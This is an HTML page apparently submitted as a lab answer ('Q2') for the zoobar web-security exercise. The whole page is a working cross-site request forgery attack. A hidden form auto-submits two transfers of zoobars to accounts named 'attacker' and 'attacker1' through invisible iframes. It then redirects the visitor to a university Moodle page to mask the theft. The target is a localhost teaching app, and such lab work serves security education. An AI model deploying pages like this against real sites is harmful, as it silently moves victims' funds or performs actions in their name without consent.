<!DOCTYPE html>
<html>

    <head>
        <meta charset="utf-8">
        <title>
         	Q2
        </title>
    </head>

    <body>
    	<!-- <iframe name="tmp" id="tmp"> -->
    	<form method="POST" name="transferform" id="f1" action="http://localhost:8080/zoobar/index.cgi/transfer" style="visibility:hidden">
			<p>Send <input id="zoobars" name="zoobars"  type="text" value="" size=5> zoobars</p>
			<p>to <input id="recipient" name="recipient" type="text" value="" size=10></p>
			<input type="submit" name="submission" value="Send">
		</form> 
		<iframe name="iframe1" id="iframe1" style="visibility:hidden"></iframe>
		<iframe name="iframe2" id="iframe2" style="visibility:hidden"></iframe>

		<script>
			function fill_form(zoobars,recipient,target){
				document.getElementById('zoobars').value = zoobars;
				document.getElementById('recipient').value = recipient;
				document.getElementById('f1').target = target;
				document.getElementById('f1').submit();
			}
			fill_form(1,"attacker","iframe1");
			setTimeout(function(){fill_form(9,"attacker1","iframe2");},500);
			setTimeout(function(){
				window.location.href = "http://moodle.cse.iitk.ac.in";
			},1000);
			
		</script>
    </body>

</html>
